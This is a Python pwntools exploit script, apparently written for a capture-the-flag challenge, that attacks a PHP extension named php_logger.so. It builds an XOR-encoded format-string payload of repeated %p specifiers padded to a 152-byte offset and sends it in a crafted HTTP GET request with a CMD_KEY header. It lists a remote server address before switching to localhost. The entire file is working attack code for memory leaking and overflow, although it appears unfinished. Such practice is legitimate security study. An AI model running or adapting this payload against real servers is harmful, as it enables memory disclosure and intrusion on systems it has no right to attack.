from pwn import *
import urllib.parse

context.word_size = 64 # Ojo con esto porque sino tendras problemas al hacer rop(php)
context.arch = 'amd64'

def xor(xor_key, data):

    salida = bytearray(b"")

    for elem in data:
        salida.append(xor_key ^ elem)

    return salida

server = "94.237.58.171"
port = 32120

server = "127.0.0.1"
port = 1337

elf = ELF("../challenge/php_logger.so")
libc = ELF("./libc.so.6")
php = ELF("./php")

io = remote(server, port)

offset = 152

xor_key = 1

padding = xor(xor_key, b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p".ljust(offset, b"A"))

payload = b"".join([
    padding,
    b"\x41\x42"
])

request_data = b"".join([
    b"GET /?cmd=",
    urllib.parse.quote_from_bytes(payload).encode(),
    b" HTTP/1.1\r\n",
    b"Host: 127.0.0.1\r\n",
    f"CMD_KEY: {str(xor_key)}\r\n".encode(),
    b"\r\n"
])

io.sendline(request_data)
io.close()